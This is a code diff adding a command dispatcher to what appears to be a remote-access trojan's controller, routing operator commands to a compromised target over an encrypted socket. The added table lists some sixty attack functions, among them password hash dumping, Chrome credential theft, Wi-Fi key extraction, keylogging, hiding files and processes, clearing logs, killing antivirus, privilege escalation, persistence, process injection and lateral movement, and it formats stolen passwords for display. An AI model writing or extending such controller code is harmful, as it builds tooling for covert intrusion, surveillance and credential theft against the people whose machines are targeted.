@@ -1707,6 +1707,122 @@ def sync_stitch_targets():
         log_debug(f"Error syncing targets: {str(e)}", "ERROR", "Sync")
         return []
 
+def execute_elite_command(cmd_name, cmd_args, target_ip, parameters=None):
+    """Execute elite command using direct implementation"""
+    try:
+        # Import elite commands
+        from Core.elite_commands import *
+        
+        # Get command function
+        command_functions = {
+            'elite_ls': elite_ls,
+            'elite_download': elite_download,
+            'elite_upload': elite_upload,
+            'elite_shell': elite_shell,
+            'elite_ps': elite_ps,
+            'elite_kill': elite_kill,
+            'elite_cd': elite_cd,
+            'elite_pwd': elite_pwd,
+            'elite_cat': elite_cat,
+            'elite_rm': elite_rm,
+            'elite_mkdir': elite_mkdir,
+            'elite_cp': elite_cp,
+            'elite_mv': elite_mv,
+            'elite_rmdir': elite_rmdir,
+            'elite_touch': elite_touch,
+            'elite_systeminfo': elite_systeminfo,
+            'elite_whoami': elite_whoami,
+            'elite_hostname': elite_hostname,
+            'elite_network': elite_network,
+            'elite_processes': elite_processes,
+            'elite_privileges': elite_privileges,
+            'elite_username': elite_username,
+            'elite_installedsoftware': elite_installedsoftware,
+            'elite_environment': elite_environment,
+            'elite_drives': elite_drives,
+            'elite_location': elite_location,
+            'elite_lsmod': elite_lsmod,
+            'elite_fileinfo': elite_fileinfo,
+            'elite_hashdump': elite_hashdump,
+            'elite_chromedump': elite_chromedump,
+            'elite_wifikeys': elite_wifikeys,
+            'elite_screenshot': elite_screenshot,
+            'elite_keylogger': elite_keylogger,
+            'elite_hidefile': elite_hidefile,
+            'elite_hideprocess': elite_hideprocess,
+            'elite_clearlogs': elite_clearlogs,
+            'elite_firewall': elite_firewall,
+            'elite_escalate': elite_escalate,
+            'elite_clearev': elite_clearev,
+            'elite_avkill': elite_avkill,
+            'elite_avscan': elite_avscan,
+            'elite_scanreg': elite_scanreg,
+            'elite_inject': elite_inject,
+            'elite_migrate': elite_migrate,
+            'elite_vmscan': elite_vmscan,
+            'elite_port_forward': elite_port_forward,
+            'elite_persistence': elite_persistence,
+            'elite_hostsfile': elite_hostsfile,
+            'elite_askpassword': elite_askpassword,
+            'elite_crackpassword': elite_crackpassword,
+            'elite_dns_tunnel': elite_dns_tunnel,
+            'elite_lateral': elite_lateral,
+            'elite_ssh': elite_ssh,
+            'elite_freeze': elite_freeze,
+            'elite_popup': elite_popup,
+            'elite_lockscreen': elite_lockscreen,
+            'elite_logintext': elite_logintext,
+            'elite_sudo': elite_sudo,
+            'elite_persist': elite_persist
+        }
+        
+        if cmd_name not in command_functions:
+            return f"❌ Unknown elite command: {cmd_name}"
+        
+        # Execute the elite command
+        command_func = command_functions[cmd_name]
+        
+        # Parse arguments based on command
+        if cmd_args:
+            args = cmd_args.split()
+            if len(args) == 1:
+                result = command_func(args[0])
+            elif len(args) == 2:
+                result = command_func(args[0], args[1])
+            elif len(args) >= 3:
+                result = command_func(*args)
+            else:
+                result = command_func()
+        else:
+            result = command_func()
+        
+        # Format result for display
+        if isinstance(result, dict):
+            if result.get('success'):
+                output = f"✅ Elite Command: {cmd_name}\n"
+                output += f"🎯 Target: {target_ip}\n\n"
+                
+                if 'message' in result:
+                    output += f"{result['message']}\n\n"
+                
+                if 'data' in result:
+                    output += f"📊 Results:\n{json.dumps(result['data'], indent=2)}\n"
+                elif 'password' in result:
+                    output += f"🔑 Password: {result['password']}\n"
+                elif 'output' in result:
+                    output += f"📄 Output:\n{result['output']}\n"
+                
+                return output
+            else:
+                return f"❌ Elite Command Failed: {cmd_name}\n🎯 Target: {target_ip}\n\n💥 Error: {result.get('error', 'Unknown error')}"
+        else:
+            return f"✅ Elite Command: {cmd_name}\n🎯 Target: {target_ip}\n\n📄 Result:\n{str(result)}"
+            
+    except ImportError as e:
+        return f"❌ Elite commands not available: {str(e)}\n\nEnsure Core/elite_commands package is properly installed."
+    except Exception as e:
+        return f"❌ Elite command execution failed: {str(e)}"
+
 def execute_real_command(command, conn_id=None, parameters=None):
     """Execute command - REAL implementation, not simulated
     
@@ -1993,6 +2109,10 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
         cmd_parts = command.strip().split(maxsplit=1)
         cmd_name = cmd_parts[0].lower() if cmd_parts else ''
         cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ''
+        
+        # Check if this is an elite command
+        if cmd_name.startswith('elite_'):
+            return execute_elite_command(cmd_name, cmd_args, target_ip, parameters)
         
         if parameters is None:
             # Try parsing inline parameters from command string
